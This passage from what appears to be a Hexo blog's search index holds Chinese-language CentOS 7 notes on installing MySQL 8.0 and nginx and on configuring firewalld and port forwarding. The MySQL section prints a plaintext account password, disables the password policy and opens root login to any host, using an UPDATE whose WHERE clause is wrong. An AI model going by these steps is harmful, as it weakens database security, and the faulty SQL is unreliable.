class="regexp">//</span>得到三个文件</span><br><span class="line"><span class="regexp">//my</span>sql-test-<span class="number">8.0</span>.<span class="number">22</span>-el7-x86_64.tar.gz</span><br><span class="line"><span class="regexp">//my</span>sql-<span class="number">8.0</span>.<span class="number">22</span>-el7-x86_64.tar.gz</span><br><span class="line"><span class="regexp">//my</span>sql-router-<span class="number">8.0</span>.<span class="number">22</span>-el7-x86_64.tar.gz</span><br><span class="line">yum install -y gcc gcc-c++ cmake openssl openssl-devel ncurses ncurses-devel libaio-devel</span><br><span class="line">yum install epel-release -y</span><br><span class="line">yum install cmake3 -y</span><br><span class="line"><span class="regexp">//</span>安装devtoolset包</span><br><span class="line">yum install centos-release-scl</span><br><span class="line">yum install devtoolset-<span class="number">4</span></span><br><span class="line"><span class="regexp">//</span>激活gcc版本，使其生效</span><br><span class="line">scl enable devtoolset-<span class="number">4</span> bash</span><br><span class="line">或</span><br><span class="line">source <span class="regexp">/opt/</span>rh<span class="regexp">/devtoolset-4/</span>enable</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Service </category>
          
          <category> Mysql </category>
          
          <category> Sortware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Service </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7_firewalld</title>
      <link href="/Centos7_firewalld.htm"/>
      <url>/Centos7_firewalld.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Firewalld"><a href="#Firewalld" class="headerlink" title="Firewalld"></a>Firewalld</h1><ol><li><p>防火墙服务状态</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">systemctl status firewalld</span></span><br></pre></td></tr></table></figure><span id="more"></span></li><li><p>防火墙状态</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">firewall-cmd <span class="comment">--state</span></span><br></pre></td></tr></table></figure></li><li><p>开启重启关闭firewalld.service服务</p><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启</span></span><br><span class="line"><span class="params">system</span>ctl start firewalld</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line"><span class="params">system</span>ctl restart firewalld</span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line"><span class="params">system</span>ctl stop firewalld</span><br></pre></td></tr></table></figure></li><li><p>查看防火墙规则</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">firewall-cmd <span class="comment">--list-all </span></span><br></pre></td></tr></table></figure></li><li><p>查询开放关闭端口</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询端口是否开放</span></span><br><span class="line">firewall-<span class="keyword">cmd</span><span class="language-bash"> --query-port=8080/tcp</span></span><br><span class="line"><span class="comment"># 开放80端口</span></span><br><span class="line">firewall-<span class="keyword">cmd</span><span class="language-bash"> --permanent --add-port=80/tcp</span></span><br><span class="line"><span class="comment"># 移除端口</span></span><br><span class="line">firewall-<span class="keyword">cmd</span><span class="language-bash"> --permanent --remove-port=8080/tcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启防火墙(修改配置后要重启防火墙)</span></span><br><span class="line">firewall-<span class="keyword">cmd</span><span class="language-bash"> --reload</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数解释</span></span><br><span class="line"><span class="number">1</span>、firwall-<span class="keyword">cmd</span><span class="language-bash">：是Linux提供的操作firewall的一个工具；</span></span><br><span class="line"><span class="number">2</span>、--permanent：表示设置为持久；</span><br><span class="line"><span class="number">3</span>、--<span class="keyword">add</span><span class="language-bash">-port：标识添加的端口；</span></span><br></pre></td></tr></table></figure></li><li><p>查询本机使用的端口</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netstat -tlunp</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Firewall </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Firewall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7安装mysql8.0和日常命令</title>
      <link href="/Centos7%E5%AE%89%E8%A3%85mysql8.0.htm"/>
      <url>/Centos7%E5%AE%89%E8%A3%85mysql8.0.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Centos7安装mysql8-0"><a href="#Centos7安装mysql8-0" class="headerlink" title="Centos7安装mysql8.0"></a>Centos7安装mysql8.0</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep mysql</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># rpm -ev [需要移除组件的名称]</span></span><br><span class="line">或者</span><br><span class="line"><span class="meta"># rpm -e --nodeps [需要移除组件的名称]  <span class="comment">//此命令为强制卸载</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">wget http:<span class="comment">//repo.mysql.com/mysql80-community-release-el7-1.noarch.rpm</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install mysql-server</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl list-unit-files|grep mysqld</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> mysqld.service</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查看是否启动MySQL服务</span><br><span class="line"><span class="comment"># ps -ef|grep mysql</span></span><br><span class="line"></span><br><span class="line">启动服务</span><br><span class="line"><span class="comment"># systemctl start mysqld.service</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chown -R mysql <span class="regexp">/var/</span>lib/mysql</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysqld --initialize</span><br></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&#x27;temporary password&#x27;</span> /<span class="keyword">var</span>/log/mysqld.log</span><br></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;你的密码&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">alter user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;12345678&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;yuanweile&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">with</span> mysql_native_password <span class="keyword">by</span> <span class="string">&#x27;@@@000TrojanYWL000@@@&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">update</span> <span class="keyword">on</span> trojanywl.* <span class="keyword">to</span> <span class="string">&#x27;yuanweile&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span></span><br><span class="line">//<span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span>, <span class="keyword">DELETE</span></span><br></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">SHOW GRANTS FOR <span class="string">&#x27;yuanweile&#x27;</span>@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password.policy=<span class="number">0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"><span class="comment">#修改root账户权限</span></span><br><span class="line">update user <span class="built_in">set</span> host = <span class="string">&#x27;%&#x27;</span> <span class="built_in">where</span> host = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="comment">#刷新权限</span></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Service </category>
          
          <category> Mysql </category>
          
          <category> Sortware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Service </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7_firewalld_端口转发</title>
      <link href="/centos7_%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.htm"/>
      <url>/centos7_%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.htm</url>
      
        <content type="html"><![CDATA[<p>查看一个masquerade状态，查询命令如下:</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">firewall-cmd <span class="comment">--query-masquerade</span></span><br></pre></td></tr></table></figure><p>假如查到结果为no那么就启动它（加–permanent是永久）</p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">firewall</span><span class="literal">-</span><span class="comment">cmd</span> <span class="literal">--</span><span class="comment">add</span><span class="literal">-</span><span class="comment">masquerade</span> <span class="literal">--</span><span class="comment">permanent</span></span><br></pre></td></tr></table></figure><p>首先防火墙打开本机对外的端口</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">firewall-cmd <span class="params">--add-port=</span>本机开发的端口<span class="string">/tcp</span> <span class="params">--permanent</span> </span><br></pre></td></tr></table></figure><p>接下来就是映射</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-forward-port=port=本机开放的端口<span class="symbol">:proto=tcp</span><span class="symbol">:toaddr=</span>(转发到机器的<span class="title class_">IP</span>)<span class="symbol">:toport=</span>(转发到机器的端口)</span><br></pre></td></tr></table></figure><p>重新加载</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">firewall-cmd <span class="comment">--reload</span></span><br></pre></td></tr></table></figure><p>查看一下结果</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">firewall-cmd <span class="comment">--list-all</span></span><br></pre></td></tr></table></figure><p>如无意外映射成功需要删除的话如下：</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --remove-forward-port=port=本机开放的端口<span class="symbol">:proto=tcp</span><span class="symbol">:toaddr=</span>(转发到机器的<span class="title class_">IP</span>)<span class="symbol">:toport=</span>(转发到机器的端口)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Firewall </category>
          
          <category> port-forward </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Firewall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx安装和编译</title>
      <link href="/nginx%E5%AE%89%E8%A3%85%E5%92%8C%E7%BC%96%E8%AF%91.htm"/>
      <url>/nginx%E5%AE%89%E8%A3%85%E5%92%8C%E7%BC%96%E8%AF%91.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx安装和编译"><a href="#Nginx安装和编译" class="headerlink" title="Nginx安装和编译"></a>Nginx安装和编译</h1><h2 id="yum源安装"><a href="#yum源安装" class="headerlink" title="yum源安装"></a>yum源安装</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ autoconf automake make</span><br><span class="line"></span><br><span class="line">yum -y install zlib zlib-devel openssl openssl-devel pcre pcre-devel</span><br><span class="line"></span><br><span class="line">sudo rpm -Uvh http:<span class="regexp">//</span>nginx.org<span class="regexp">/packages/</span>centos<span class="regexp">/7/</span>noarch<span class="regexp">/RPMS/</span>nginx-release-centos-<span class="number">7</span>-<span class="number">0</span>.el7.ngx.noarch.rpm</span><br><span class="line"></span><br><span class="line">yum install -y nginx</span><br></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line"><span class="params">system</span>ctl start nginx.service</span><br><span class="line"><span class="params">system</span>ctl enable nginx.service</span><br></pre></td></tr></table></figure><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">yum -y install gcc gcc-c++ autoconf automake make      </span><br><span class="line">yum -y install zlib zlib-devel openssl openssl-devel pcre pcre-devel</span><br><span class="line">groupadd -f nginx</span><br><span class="line">useradd -g nginx nginx</span><br><span class="line">wget https:<span class="regexp">//</span>nginx.org<span class="regexp">/download/</span>nginx-<span class="number">1.19</span>.<span class="number">0</span>.tar.gz</span><br><span class="line"><span class="comment">#下载官网https://nginx.org/en/download.html</span></span><br><span class="line">wget https:<span class="regexp">//gi</span>thub.com<span class="regexp">/openssl/</span>openssl<span class="regexp">/archive/</span>OpenSSL_1_1_1h.tar.gz</span><br><span class="line"><span class="comment">#openssl源码下载 https://github.com/openssl/openssl/releases</span></span><br></pre></td></tr></table></figure><p>先更新openssl</p><p>进入openssl源码目录</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">yum -y install perl perl-devel gcc gcc-c++</span><br><span class="line">./config shared zlib</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">mv <span class="regexp">/usr/</span>bin<span class="regexp">/openssl /u</span>sr<span class="regexp">/bin/</span>openssl.bak</span><br><span class="line">mv <span class="regexp">/usr/i</span>nclude<span class="regexp">/openssl /u</span>sr<span class="regexp">/include/</span>openssl.bak</span><br><span class="line"><span class="keyword">find</span> / -name openssl</span><br><span class="line">ln -s <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>openssl <span class="regexp">/usr/</span>bin/openssl</span><br><span class="line">ln -s <span class="regexp">/usr/</span>local<span class="regexp">/include/</span>openssl <span class="regexp">/usr/i</span>nclude/openssl</span><br><span class="line">echo <span class="string">&quot;/usr/local/lib64/&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>ld.so.conf</span><br><span class="line">ldconfig</span><br><span class="line">openssl version -a</span><br><span class="line">openssl version</span><br></pre></td></tr></table></figure><p>解压了nginx源码之后</p><p>进入到nginx源码目录</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>新增加stream 和 pressl支持编译</span><br><span class="line">.<span class="regexp">/configure --user=nginx --group=nginx --prefix=/</span>nginx_main --sbin-path=<span class="regexp">/usr/</span>sbin<span class="regexp">/nginx --conf-path=/</span>etc<span class="regexp">/nginx/</span>nginx.conf --http-log-path=<span class="regexp">/nginx/</span>log<span class="regexp">/access.log --error-log-path=/</span>nginx<span class="regexp">/log/</span>error.log --lock-path=<span class="regexp">/var/</span>lock<span class="regexp">/nginx.lock --pid-path=/</span>run<span class="regexp">/nginx.pid --modules-path=/u</span>sr<span class="regexp">/lib/</span>nginx<span class="regexp">/modules --http-client-body-temp-path=/</span>var<span class="regexp">/lib/</span>nginx<span class="regexp">/body --http-fastcgi-temp-path=/</span>var<span class="regexp">/lib/</span>nginx<span class="regexp">/fastcgi --http-proxy-temp-path=/</span>var<span class="regexp">/lib/</span>nginx<span class="regexp">/proxy --http-scgi-temp-path=/</span>var<span class="regexp">/lib/</span>nginx<span class="regexp">/scgi --http-uwsgi-temp-path=/</span>var<span class="regexp">/lib/</span>nginx<span class="regexp">/uwsgi --with-openssl=/</span>root<span class="regexp">/install/</span>openssl-OpenSSL_1_1_1h --with-pcre-jit --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --with-http_auth_request_module --with-http_v2_module --with-http_dav_module --with-http_slice_module --with-threads --with-http_addition_module --with-http_gunzip_module --with-http_gzip_static_module --with-stream --with-http_sub_module --with-stream=dynamic --with-stream_ssl_module --with-mail=dynamic --with-stream_ssl_preread_module --with-mail_ssl_module --with-cc-opt=<span class="string">&#x27;-g -O2 -Wp,-D_FORTIFY_SOURCE=2&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">./configure <span class="string">\</span></span><br><span class="line">--user=nginx <span class="string">\</span></span><br><span class="line">--group=nginx <span class="string">\</span></span><br><span class="line">--prefix=/nginx_main <span class="string">\</span></span><br><span class="line">--sbin-path=/usr/sbin/nginx <span class="string">\</span></span><br><span class="line">--conf-path=/etc/nginx/nginx.conf <span class="string">\</span></span><br><span class="line">--http-log-path=/nginx/log/access.log <span class="string">\</span></span><br><span class="line">--error-log-path=/nginx/log/error.log <span class="string">\</span></span><br><span class="line">--lock-path=/<span class="keyword">var</span>/lock/nginx.lock <span class="string">\</span></span><br><span class="line">--pid-path=/run/nginx.pid <span class="string">\</span></span><br><span class="line">--modules-path=/usr/lib/nginx/modules <span class="string">\</span></span><br><span class="line">--http-client-body-temp-path=/<span class="keyword">var</span>/lib/nginx/body <span class="string">\</span></span><br><span class="line">--http-fastcgi-temp-path=/<span class="keyword">var</span>/lib/nginx/fastcgi <span class="string">\</span></span><br><span class="line">--http-proxy-temp-path=/<span class="keyword">var</span>/lib/nginx/proxy <span class="string">\</span></span><br><span class="line">--http-scgi-temp-path=/<span class="keyword">var</span>/lib/nginx/scgi <span class="string">\</span></span><br><span class="line">--http-uwsgi-temp-path=/<span class="keyword">var</span>/lib/nginx/uwsgi <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-openssl=/root/openssl-<span class="number">1.1</span>.<span class="number">1g</span> <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-pcre-jit <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_ssl_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_stub_status_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_realip_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_auth_request_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_v2_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_dav_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_slice_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-threads <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_addition_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_gunzip_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_gzip_static_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-http_sub_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-stream <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-stream=dynamic <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-stream_ssl_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-mail=dynamic <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-stream_ssl_preread_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-mail_ssl_module <span class="string">\</span></span><br><span class="line">--<span class="keyword">with</span>-cc-opt=<span class="string">&#x27;-g -O2 -Wp,-D_FORTIFY_SOURCE=2&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">make</span> &amp;&amp; <span class="built_in">make</span> install</span><br></pre></td></tr></table></figure><p>如果需要修改响应头的信息:</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">修改server要在编译Nginx修改<span class="regexp">/src/</span>core/nginx.h文件</span><br><span class="line"></span><br><span class="line">#define NGINX_VERSION    <span class="string">&quot;1.14&quot;</span>  </span><br><span class="line">#define NGINX_VER       <span class="string">&quot;nginx&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>: 修改src<span class="regexp">/http/</span>ngx_http_header_filter_module.c</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ngx_http_server_string[]=<span class="string">&quot;Server: nginx&quot;</span> CRLF;</span><br><span class="line"><span class="number">3</span>: 修改src<span class="regexp">/http/</span>ngx_http_special_response.c</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u_char ngx_http_error_tail[]=<span class="string">&quot;&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;&quot;</span> CRLF</span><br></pre></td></tr></table></figure><p>(macOS nginx 配置文件目录/usr/local/etc/nginx)</p><p>nginx命令</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">nginx -s reopen <span class="comment">#重启Nginx</span></span><br><span class="line"></span><br><span class="line">nginx -s <span class="keyword">reload</span> <span class="comment">#重新加载Nginx配置文件，然后以优雅的方式重启Nginx</span></span><br><span class="line"></span><br><span class="line">nginx -s stop <span class="comment">#强制停止Nginx服务</span></span><br><span class="line"></span><br><span class="line">nginx -s <span class="keyword">quit</span> <span class="comment">#优雅地停止Nginx服务（即处理完所有请求后再停止服务）</span></span><br><span class="line"></span><br><span class="line">nginx -t <span class="comment">#检测配置文件是否有语法错误，然后退出</span></span><br><span class="line"></span><br><span class="line">nginx -?,-h <span class="comment">#打开帮助信息</span></span><br><span class="line"></span><br><span class="line">nginx -v <span class="comment">#显示版本信息并退出</span></span><br><span class="line"></span><br><span class="line">nginx -V <span class="comment">#显示版本和配置选项信息，然后退出</span></span><br><span class="line"></span><br><span class="line">nginx -t <span class="comment">#检测配置文件是否有语法错误，然后退出</span></span><br><span class="line"></span><br><span class="line">nginx -T <span class="comment">#检测配置文件是否有语法错误，转储并退出</span></span><br><span class="line"></span><br><span class="line">nginx -q <span class="comment">#在检测配置文件期间屏蔽非错误信息</span></span><br><span class="line"></span><br><span class="line">nginx -p prefix <span class="comment">#设置前缀路径(默认是:/usr/share/nginx/)</span></span><br><span class="line"></span><br><span class="line">nginx -c filename <span class="comment">#设置配置文件(默认是:/etc/nginx/nginx.conf)</span></span><br><span class="line"></span><br><span class="line">nginx -g directives <span class="comment">#设置配置文件外的全局指令</span></span><br><span class="line"></span><br><span class="line">killall nginx <span class="comment">#杀死所有nginx进程</span></span><br></pre></td></tr></table></figure><p>nginx开机自启配置</p><p>vi /usr/lib/systemd/system/nginx.service</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=nginx</span><br><span class="line"><span class="attr">After</span>=network.target</span><br><span class="line">  </span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=forking</span><br><span class="line"><span class="attr">ExecStart</span>=/usr/sbin/nginx</span><br><span class="line"><span class="attr">ExecReload</span>=/usr/sbin/nginx -s reload</span><br><span class="line"><span class="attr">ExecStop</span>=/usr/sbin/nginx -s quit</span><br><span class="line"><span class="attr">PrivateTmp</span>=<span class="literal">true</span></span><br><span class="line">  </span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line"><span class="params">system</span>ctl enable nginx.service</span><br><span class="line"><span class="params">system</span>ctl start nginx.service</span><br></pre></td></tr></table></figure><p>手动编译的模块信息：</p><p>–help</p><pre><code>打印帮助信息。</code></pre><p>–prefix=path</p><pre><code>定义将保留服务器文件的目录。此相同目录还将用于设置的所有相对路径 configure（库源路径除外）和nginx.conf配置文件中。/usr/local/nginx默认情况下设置为目录。</code></pre><p>–sbin-path=path</p><pre><code>设置nginx可执行文件的名称。此名称仅在安装期间使用。默认情况下，文件名为 prefix/sbin/nginx。</code></pre><p>–modules-path=path</p><pre><code>定义将在其中安装nginx动态模块的目录。默认情况下使用prefix/modules目录。</code></pre><p>–conf-path=path</p><pre><code>设置nginx.conf配置文件的名称。如果需要，可以通过在命令行参数中指定nginx来始终使用其他配置文件来启动它 。默认情况下，文件名为 。 -c fileprefix/conf/nginx.conf</code></pre><p>–error-log-path=path</p><pre><code>设置主要错误，警告和诊断文件的名称。安装后，可以始终nginx.conf使用error_log伪指令在配置文件中 更改文件名 。默认情况下，文件名为 prefix/logs/error.log。</code></pre><p>–pid-path=path</p><pre><code>设置nginx.pid将存储主进程的进程ID 的文件名。安装后，可以始终nginx.conf使用pid伪指令在配置文件中 更改文件名 。默认情况下，文件名为 prefix/logs/nginx.pid。</code></pre><p>–lock-path=path</p><pre><code>为锁定文件的名称设置前缀。安装后，可以始终nginx.conf使用lock_file伪指令在配置文件中 更改该值 。默认情况下，值为 prefix/logs/nginx.lock。</code></pre><p>–user=name</p><pre><code>设置一个非特权用户的名称，其凭据将由工作进程使用。安装后，可以始终nginx.conf使用用户指令在配置文件中 更改名称 。默认用户名是nobody。</code></pre><p>–group=name</p><pre><code>设置其凭据将由工作进程使用的组的名称。安装后，可以始终nginx.conf使用用户指令在配置文件中 更改名称 。默认情况下，组名称设置为非特权用户的名称。</code></pre><p>–build=name</p><pre><code>设置一个可选的nginx构建名称。</code></pre><p>–builddir=path</p><pre><code>设置构建目录。</code></pre><p>–with-select_module 和 –without-select_module</p><pre><code>启用或禁用构建允许服务器使用该select()方法的模块。如果平台似乎不支持kqueue，epoll或/ dev / poll等更合适的方法，则会自动构建此模块。</code></pre><p>–with-poll_module 和 –without-poll_module</p><pre><code>启用或禁用构建允许服务器使用该poll()方法的模块。如果平台似乎不支持kqueue，epoll或/ dev / poll等更合适的方法，则会自动构建此模块。</code></pre><p>–with-threads</p><pre><code>启用线程池的使用 。</code></pre><p>–with-file-aio</p><pre><code>支持 在FreeBSD和Linux上使用 异步文件I / O（AIO）。</code></pre><p>–with-http_ssl_module</p><pre><code>启用构建将HTTPS协议支持添加 到HTTP服务器的模块的功能。默认情况下未构建此模块。需要OpenSSL库来构建和运行此模块。</code></pre><p>–with-http_v2_module</p><pre><code>支持构建一个模块，该模块提供对HTTP / 2的支持 。默认情况下未构建此模块。</code></pre><p>–with-http_realip_module</p><pre><code>支持构建ngx_http_realip_module 模块，该 模块将客户端地址更改为在指定的标头字段中发送的地址。默认情况下未构建此模块。</code></pre><p>–with-http_addition_module</p><pre><code>允许构建ngx_http_addition_module 模块，该 模块在响应之前和之后添加文本。默认情况下未构建此模块。</code></pre><p>–with-http_xslt_module 和 –with-http_xslt_module=dynamic</p><pre><code>支持构建ngx_http_xslt_module 模块，该 模块使用一个或多个XSLT样式表转换XML响应。默认情况下未构建此模块。该libxml2的和 的libxslt库需要构建和运行此模块。</code></pre><p>–with-http_image_filter_module 和 –with-http_image_filter_module=dynamic</p><pre><code>支持构建ngx_http_image_filter_module 模块，该 模块可以转换JPEG，GIF，PNG和WebP格式的图像。默认情况下未构建此模块。</code></pre><p>–with-http_geoip_module 和 –with-http_geoip_module=dynamic</p><pre><code>支持构建ngx_http_geoip_module 模块，该 模块根据客户端IP地址和预编译的MaxMind数据库创建变量 。默认情况下未构建此模块。</code></pre><p>–with-http_sub_module</p><pre><code>支持构建ngx_http_sub_module 模块，该 模块通过将一个指定的字符串替换为另一个指定的字符串来修改响应。默认情况下未构建此模块。</code></pre><p>–with-http_dav_module</p><pre><code>支持构建ngx_http_dav_module 模块，该 模块通过WebDAV协议提供文件管理自动化。默认情况下未构建此模块。</code></pre><p>–with-http_flv_module</p><pre><code>支持构建ngx_http_flv_module 模块，该 模块为Flash Video（FLV）文件提供伪流服务器端支持。默认情况下未构建此模块。</code></pre><p>–with-http_mp4_module    </p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">支持构建<span class="symbol">ngx_http_mp4</span>_module 模块，该 模块为MP<span class="number">4</span>文件提供伪流服务器端支持。默认情况下未构建此模块。</span><br></pre></td></tr></table></figure><p>–with-http_gunzip_module</p><pre><code>支持为不支持“ gzip”编码方法的客户端构建ngx_http_gunzip_module 模块，该 模块使用“ Content-Encoding: gzip” 解压缩响应。默认情况下未构建此模块。</code></pre><p>–with-http_gzip_static_module</p><pre><code>支持构建ngx_http_gzip_static_module 模块，该 模块支持发送.gz扩展名为“ ”的预压缩文件，而不是常规文件。默认情况下未构建此模块。</code></pre><p>–with-http_auth_request_module</p><pre><code>允许构建ngx_http_auth_request_module 模块，该 模块基于子请求的结果实现客户端授权。默认情况下未构建此模块。</code></pre><p>–with-http_random_index_module</p><pre><code>支持构建ngx_http_random_index_module 模块，该 模块处理以斜杠（&apos; /&apos;）结尾的请求，并从目录中选择一个随机文件作为索引文件。默认情况下未构建此模块。</code></pre><p>–with-http_secure_link_module</p><pre><code>启用构建 ngx_http_secure_link_module 模块。默认情况下未构建此模块。</code></pre><p>–with-http_degradation_module</p><pre><code>启用构建 ngx_http_degradation_module模块。默认情况下未构建此模块。</code></pre><p>–with-http_slice_module</p><pre><code>支持构建ngx_http_slice_module 模块，该 模块将请求拆分为子请求，每个子请求返回一定范围的响应。该模块提供了更有效的大响应缓存。默认情况下未构建此模块。</code></pre><p>–with-http_stub_status_module</p><pre><code>支持构建ngx_http_stub_status_module 模块，该 模块提供对基本状态信息的访问。默认情况下未构建此模块。</code></pre><p>–without-http_charset_module</p><pre><code>禁用构建ngx_http_charset_module 模块，该 模块将指定的字符集添加到“ Content-Type”响应头字段中，并且可以将数据从一个字符集转换为另一个字符集。</code></pre><p>–without-http_gzip_module</p><pre><code>禁用构建可压缩 HTTP服务器响应的模块。zlib库是构建和运行此模块所必需的。</code></pre><p>–without-http_ssi_module</p><pre><code>禁用构建 处理通过SSI（服务器端包含）命令的 